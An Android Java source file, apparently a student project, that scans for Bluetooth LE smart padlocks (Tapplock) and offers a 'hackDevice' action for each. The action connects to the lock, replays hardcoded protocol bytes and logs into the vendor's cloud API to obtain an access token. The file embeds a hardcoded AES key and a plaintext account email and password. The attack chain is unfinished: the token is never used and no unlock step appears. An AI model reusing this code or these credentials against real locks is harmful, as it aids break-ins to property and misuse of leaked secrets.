package com.example.myapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.bluetooth.le.*;
import android.os.Bundle;
import android.os.ParcelUuid;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.navigation.ui.AppBarConfiguration;
import com.example.myapplication.databinding.ActivityMainBinding;
import com.mrtan.bluetooth.Bridge.Command;
import okhttp3.*;
import org.jetbrains.annotations.NotNull;
import org.json.JSONException;
import org.json.JSONObject;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final byte[] KEY="tprjrA5kkKyvh4nw".getBytes();
    private Cipher cip;
    private Cipher decip;
    private String accessToken;
    private BluetoothLeScanner scan;
    boolean isScanning=false;
    private AppBarConfiguration appBarConfiguration;
    private ActivityMainBinding binding;
    private ArrayList<BluetoothDevice> devices;

    ScanCallback bleCallbackFunction = new ScanCallback() {
        @Override
        public void onScanFailed(int errorCode) {
            Toast.makeText(getApplicationContext(), "Couldn't start scan", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onScanResult(int callbacktype, ScanResult result) {
            BluetoothDevice resultDevice = result.getDevice();
            boolean exists=false;
            for (BluetoothDevice aDevice:devices
                 ) {
                if (aDevice.getAddress().equals(resultDevice.getAddress())){
                    exists=true;
                }
            }
                if(!exists){
                    System.out.println("Found new device");
                    addDevice(resultDevice);
                }
        }
        @Override
        public void onBatchScanResults (List<ScanResult> results){
            System.out.println("ScanBatchResult");
            for (ScanResult device:results) {
                addDevice(device.getDevice());
            }
        }
    };

    @SuppressLint("GetInstance")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            cip = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cip.init(Cipher.ENCRYPT_MODE,new SecretKeySpec(KEY, "AES"));
            decip = Cipher.getInstance("AES/ECB/PKCS5Padding");
            decip.init(Cipher.DECRYPT_MODE,new SecretKeySpec(KEY, "AES"));
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
            throw new RuntimeException(e);
        }
        System.out.println("=========================================================");
        System.out.println(System.getProperty("java.library.path"));
        devices=new ArrayList<>();
        super.onCreate(savedInstanceState);
        ScanFilter filter=(new ScanFilter.Builder()).setServiceUuid(ParcelUuid.fromString("6e400001-b5a3-f393-e0a9-e50e24dcca9e")).build();
        ArrayList<ScanFilter> filterList= new ArrayList<>();
        filterList.add(filter);
        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.BLUETOOTH_ADMIN,Manifest.permission.BLUETOOTH_SCAN,Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1001);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        binding.scanButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(isScanning){
                    System.out.println("======= Stop Scan");
                    binding.scanButton.setText(R.string.launchScan);
                    scan.stopScan(bleCallbackFunction);
                }
                else {
                    System.out.println("======= Start Scan");
                    BluetoothManager manage = (BluetoothManager) getApplicationContext().getSystemService(BLUETOOTH_SERVICE);
                    scan = manage.getAdapter().getBluetoothLeScanner();
                    scan.startScan(filterList, (new ScanSettings.Builder()).build(), bleCallbackFunction);
                    binding.scanButton.setText(R.string.stopScan);
                }
                isScanning=!isScanning;
            }
        });
    }

    private void addDevice(BluetoothDevice device){
        System.out.println(device.getAddress());
        devices.add(device);
        LayoutParams params =
                new LinearLayout.LayoutParams(
                        LayoutParams.MATCH_PARENT,
                        LayoutParams.WRAP_CONTENT);
        Button deviceButton= new Button(this);
        deviceButton.setText(device.getAddress());
        deviceButton.setLayoutParams(params);
        deviceButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                hackDevice(device);
            }
        });
        binding.devicesLayout.addView(deviceButton);
    }
    private byte[] getToken() {
        MediaType JSON= MediaType.get("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();
        String params;
        try {
            params=Base64.getEncoder().encodeToString(cip.doFinal("{\"mail\":\"groupe5bleu@protonmail.com\",\"password\":\"E9Rdam3736k$*Mw9>3f7a2twt\"}".getBytes()));
        } catch (BadPaddingException | IllegalBlockSizeException e) {
            throw new RuntimeException(e);
        }
        Request request= new Request.Builder()
                .url("https://consapi.tapplock.com/api/v1/users/login")
                .post(RequestBody.create(params,JSON))
                .build();
        System.out.println(request.toString());
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {

            }

            @SuppressLint("GetInstance")
            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                assert response.body() != null;
                try {
                    String strMess=response.body().string();
                    byte[] message = Base64.getDecoder().decode(strMess);
                    strMess = new String(decip.doFinal(message));
                    accessToken = new JSONObject(strMess).getString("accessToken");
                    System.out.println(accessToken);
                } catch (IllegalBlockSizeException | BadPaddingException | JSONException e) {
                    throw new RuntimeException(e);
                }
            }
        });
        return new byte[]{};
    }
    private void hackDevice(BluetoothDevice device){
        System.out.println("Hacking device "+device.getAddress());
        Command control=new Command(new Callback() {
            @Override
            public void receiveData(String address, int i, int i2, String data) {
                System.out.println("======== Receiving data ========");
                System.out.println("Address : "+ address);
                System.out.println("Code : "+i);
                System.out.println("Ret : "+i2);
                System.out.println("Data : "+ data);
            }

            @Override
            public void sendData(String address, byte[] data) {
                System.out.println("======== Sending data ========");
                System.out.println("Address : "+ address);
                System.out.println("Data : "+ Arrays.toString(data));
            }
        });
        String deviceAddr=device.getAddress();
        control.connect(deviceAddr,true);
        control.command(deviceAddr,commandType.VERSION);
        byte[] received=new byte[]{(byte) 0xaa,0x55,0x45,0x01,0x05,0x00,0x01, (byte) 0x80, (byte) 0xa6,0x00,0x02,0x73,0x02};
        control.receiveData(deviceAddr,received);
        received=new byte[]{};
        control.commandData(deviceAddr,commandType.RANDOM,received);
        received=new byte[]{(byte) 0xaa,0x55,0x01,0x03,0x05,0x00,0x01,0x06, (byte) 0xaa, (byte) 0xb5,0x2d, (byte) 0x9b,0x02};
        control.receiveData(deviceAddr,received);
        received=getToken();
    }
}